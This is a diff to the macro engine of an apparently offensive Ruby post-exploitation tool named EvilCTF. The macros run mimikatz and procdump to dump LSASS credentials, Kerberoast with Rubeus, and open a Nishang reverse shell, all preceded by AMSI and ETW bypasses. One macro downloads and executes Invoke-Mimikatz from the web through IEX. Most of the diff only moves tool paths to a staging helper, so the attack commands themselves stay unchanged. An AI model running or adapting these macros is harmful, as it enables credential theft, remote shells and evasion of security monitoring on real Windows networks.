@@ -1,5 +1,7 @@
 # frozen_string_literal: true
 
+require_relative '../staging'
+
 module EvilCTF
   module Tools
     module MacroEngine
@@ -23,30 +25,30 @@ module EvilCTF
       def build_macros
         {
           'kerberoast' => [BYPASS_4MSI_PS,
-                           '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
+                           "& \"#{EvilCTF::Staging.tool_path('Rubeus.exe')}\" kerberoast /outfile:#{EvilCTF::Staging.tool_path('hashes.txt')} 2>$null"],
           'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
-                           '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
+                           "& \"#{EvilCTF::Staging.tool_path('mimikatz.exe')}\" \"privilege::debug\" \"sekurlsa::logonpasswords\" exit 2>$null"],
           'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
-                           '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
+                           "& \"#{EvilCTF::Staging.tool_path('procdump64.exe')}\" -accepteula -ma lsass.exe \"#{EvilCTF::Staging.tool_path('lsass.dmp')}\""],
           'invoke-mimikatz' => [
             BYPASS_4MSI_PS,
             ETW_BYPASS_PS,
             'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")',
             'Invoke-Mimikatz -DumpCreds'
           ],
-          'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\SharpHound.exe" -c all 2>$null'],
-          'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\Seatbelt.exe" -group=all 2>$null'],
-          'rubeus_klist' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" klist 2>$null'],
+          'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('SharpHound.exe')}\" -c all 2>$null"],
+          'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('Seatbelt.exe')}\" -group=all 2>$null"],
+          'rubeus_klist' => [BYPASS_4MSI_PS, "& \"#{EvilCTF::Staging.tool_path('Rubeus.exe')}\" klist 2>$null"],
           'bypass-etw' => [ETW_BYPASS_PS],
           'bypass-4msi' => [BYPASS_4MSI_PS],
           'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
           'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
-                           'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
+                           "Import-Module \"#{EvilCTF::Staging.tool_path('socks.ps1')}\"; Invoke-SocksProxy -BindPort 1080"],
           'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
-                             '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
+                             "& \"#{EvilCTF::Staging.tool_path('mimikatz.exe')}\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" exit 2>$null"],
           'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
-          'powerview_all' => [BYPASS_4MSI_PS, POWERVIEW_ALL_PS],
-          'dom_enum' => [BYPASS_4MSI_PS, DOM_ENUM_PS]
+          'powerview_all' => [BYPASS_4MSI_PS, EvilCTF::Tools.powerview_all_ps],
+          'dom_enum' => [BYPASS_4MSI_PS, EvilCTF::Tools.dom_enum_ps]
         }
       end
 
@@ -191,7 +193,7 @@ module EvilCTF
       end
 
       def cleanup_partial_nishang_stage(shell)
-        remote_root = EvilCTF::Utils.escape_ps_string(TOOL_REGISTRY['nishang'][:recommended_remote])
+        remote_root = EvilCTF::Utils.escape_ps_string(EvilCTF::Tools.tool_registry['nishang'][:recommended_remote])
         cleanup_cmd = <<~PS
           if (Test-Path '#{remote_root}') {
             Remove-Item '#{remote_root}' -Recurse -Force -ErrorAction SilentlyContinue
@@ -203,7 +205,7 @@ module EvilCTF
       end
 
       def locate_nishang_rev_remote(shell)
-        search_root = TOOL_REGISTRY['nishang'][:recommended_remote].rpartition('\\').first
+        search_root = EvilCTF::Tools.tool_registry['nishang'][:recommended_remote].rpartition('\\').first
         search_root = EvilCTF::Utils.escape_ps_string(search_root)
         locate_cmd = <<~PS
           $match = Get-ChildItem -Path '#{search_root}' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse -ErrorAction SilentlyContinue |
@@ -217,7 +219,7 @@ module EvilCTF
       end
 
       def locate_inveigh_remote(shell)
-        remote = EvilCTF::Utils.escape_ps_string(INVEIGH_REMOTE)
+        remote = EvilCTF::Utils.escape_ps_string(EvilCTF::Tools.inveigh_remote)
         check_cmd = "if (Test-Path '#{remote}') { 'FOUND::#{remote}' } else { 'MISSING' }"
         check_res = EvilCTF::Execution.run(shell, check_cmd, timeout: 20)
         found_line = check_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
@@ -268,9 +270,9 @@ module EvilCTF
         when 'AttackerPort'
           '4444'
         when 'NishangRevRemote'
-          NISHANG_REV_REMOTE
+          EvilCTF::Tools.nishang_rev_remote
         when 'InveighRemote'
-          INVEIGH_REMOTE
+          EvilCTF::Tools.inveigh_remote
         end
       end
 
